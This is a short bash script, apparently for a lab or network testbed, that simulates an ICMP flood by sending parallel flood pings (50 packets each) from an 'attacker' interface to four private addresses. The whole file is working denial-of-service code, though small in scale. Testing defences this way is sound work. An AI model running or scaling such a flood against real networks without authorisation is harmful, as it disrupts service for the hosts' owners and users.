#!/bin/bash

TARGETS=("10.0.1.1" "10.0.1.2" "10.0.1.3" "10.0.1.4")

echo "Starting ICMP flood attack simulation from attacker 10.0.1.100..."

for ip in "${TARGETS[@]}"; do
    echo "Flooding $ip from 10.0.1.100"
    # Flood ping: send continuous packets, fast (-f), count 50 packets
    ping -f -c 50 -I attacker-wlan0 $ip &
done

wait

echo "Attack simulation finished."
